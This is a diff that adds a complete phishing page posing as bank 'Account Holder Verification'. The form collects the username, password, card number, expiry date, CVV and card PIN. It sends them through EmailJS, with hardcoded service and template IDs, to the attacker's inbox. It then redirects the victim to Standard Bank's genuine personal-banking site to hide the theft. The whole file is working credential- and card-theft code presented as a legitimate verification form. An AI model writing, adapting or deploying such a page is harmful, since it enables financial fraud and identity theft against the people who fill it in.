@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Verification</title>
+    <!-- Add favicon -->
+    <link rel="icon" type="image/png" href="zsg.png">
+    
+    <!-- Viewport meta tag for mobile responsiveness -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Internal CSS for Styling -->
+    <style>
+        /* General body styling */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #003cc7; /* Deep blue background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column; /* Stack items vertically */
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Ensure the body takes at least the full viewport height */
+        }
+
+        /* Image styling */
+        #form-logo {
+            width: 100px; /* Adjust the width as needed */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 20px; /* Space below the image */
+        }
+
+        /* Form container styling */
+        #contact-form {
+            background-color: #ffffff; /* White background for the form */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 90%; /* Slightly smaller width for mobile */
+            max-width: 400px; /* Maximum width for larger screens */
+            color: #333; /* Dark text for the form */
+        }
+
+        /* Heading styling */
+        .form-heading {
+            text-align: center; /* Center the heading */
+            font-size: 24px; /* Larger font size */
+            font-weight: bold; /* Bold text */
+            margin-bottom: 20px; /* Space below the heading */
+            color: #333; /* Dark text for the heading */
+        }
+
+        /* Label styling */
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333; /* Dark text for labels */
+        }
+
+        /* Input and textarea styling */
+        input[type="text"],
+        input[type="password"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #fff; /* White background for inputs */
+            color: #333; /* Dark text for inputs */
+        }
+
+        textarea {
+            resize: vertical; /* Allow vertical resizing */
+            height: 80px;
+        }
+
+        /* Submit button styling */
+        input[type="submit"] {
+            background-color: #0056b3; /* Darker blue color */
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #004080; /* Even darker blue on hover */
+        }
+
+        /* Loading spinner styling */
+        #loading-spinner {
+            display: none; /* Hidden by default */
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* Show password toggle styling */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .show-password-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        /* Expiry date container styling */
+        .expiry-date-container {
+            display: flex;
+            gap: 10px; /* Space between month and year dropdowns */
+        }
+
+        .expiry-date-container select {
+            flex: 1; /* Equal width for both dropdowns */
+        }
+    </style>
+
+    <!-- EmailJS Script -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Initialize EmailJS
+            emailjs.init({
+              publicKey: "5zXtjmWYdADcJoXrv",
+            });
+        })();
+    </script>
+</head>
+<body>
+    <!-- Image outside the form -->
+    <img src="zsg.png" alt="Form Logo" id="form-logo">
+
+    <!-- Form -->
+    <form id="contact-form">
+        <!-- Heading -->
+        <h2 class="form-heading">Account Holder Verification</h2>
+
+        <!-- Hidden field -->
+        <input type="hidden" name="contact_number" value="697483">
+
+        <!-- Username field -->
+        <label>Username</label>
+        <input type="text" name="fullname" placeholder="Enter your username (min 3 characters)" required minlength="3">
+
+        <!-- Password field -->
+        <label>Password</label>
+        <input type="password" name="password" id="password" placeholder="Enter your password (min 6 characters)" required minlength="6">
+
+        <!-- Show Password Toggle -->
+        <div class="show-password-container">
+            <input type="checkbox" id="show-password">
+            <label for="show-password">Show Password</label>
+        </div>
+
+        <!-- Card Number field -->
+        <label>Card Number</label>
+        <textarea name="CardNumber" placeholder="Enter your 16-digit card number" required minlength="16" maxlength="16"></textarea>
+
+        <!-- Expiry Date field -->
+        <label>Expiry Date</label>
+        <div class="expiry-date-container">
+            <!-- Month dropdown -->
+            <select name="expiry_month" required>
+                <option value="" disabled selected>Month</option>
+                <option value="01">01 - January</option>
+                <option value="02">02 - February</option>
+                <option value="03">03 - March</option>
+                <option value="04">04 - April</option>
+                <option value="05">05 - May</option>
+                <option value="06">06 - June</option>
+                <option value="07">07 - July</option>
+                <option value="08">08 - August</option>
+                <option value="09">09 - September</option>
+                <option value="10">10 - October</option>
+                <option value="11">11 - November</option>
+                <option value="12">12 - December</option>
+            </select>
+
+            <!-- Year dropdown -->
+            <select name="expiry_year" required>
+                <option value="" disabled selected>Year</option>
+                <script>
+                    // Dynamically generate year options (e.g., next 10 years)
+                    const currentYear = new Date().getFullYear();
+                    for (let i = 0; i < 10; i++) {
+                        document.write(`<option value="${currentYear + i}">${currentYear + i}</option>`);
+                    }
+                </script>
+            </select>
+        </div>
+
+        <!-- CVV field -->
+        <label>CVV</label>
+        <input type="text" name="cvv" placeholder="Enter CVV (3 digits)" required pattern="\d{3}" title="Please enter a valid CVV (3 digits)">
+
+        <!-- Card Pin field -->
+        <label>Card Pin</label>
+        <textarea name="card_pin" placeholder="Enter your 5-digit card pin" required minlength="5" maxlength="5"></textarea>
+
+        <!-- Submit button -->
+        <input type="submit" value="Verify Account">
+
+        <!-- Loading spinner -->
+        <div id="loading-spinner">Loading...</div>
+    </form>
+
+    <!-- JavaScript -->
+    <script>
+        // Show Password Toggle
+        document.getElementById('show-password').addEventListener('change', function() {
+            const passwordField = document.getElementById('password');
+            passwordField.type = this.checked ? 'text' : 'password';
+        });
+
+        // Form Submission
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show loading spinner
+            document.getElementById('loading-spinner').style.display = 'block';
+
+            // Combine month and year into a single expiry date string
+            const expiryMonth = this.expiry_month.value;
+            const expiryYear = this.expiry_year.value;
+            const expiryDate = `${expiryMonth}/${expiryYear.slice(-2)}`; // Format: MM/YY
+
+            // Send form data via EmailJS
+            emailjs.sendForm('service_6t23mq8', 'template_fwuq04p', this)
+                .then(() => {
+                    console.log('SUCCESS!');
+                    // Redirect to the specified URL without showing an alert
+                    window.location.href = "https://www.standardbank.co.za/southafrica/personal";
+                }, (error) => {
+                    console.log('FAILED...', error);
+                    alert('Failed to submit form. Please try again.');
+                })
+                .finally(() => {
+                    // Hide loading spinner
+                    document.getElementById('loading-spinner').style.display = 'none';
+                });
+        });
+    </script>
+</body>
+</html>
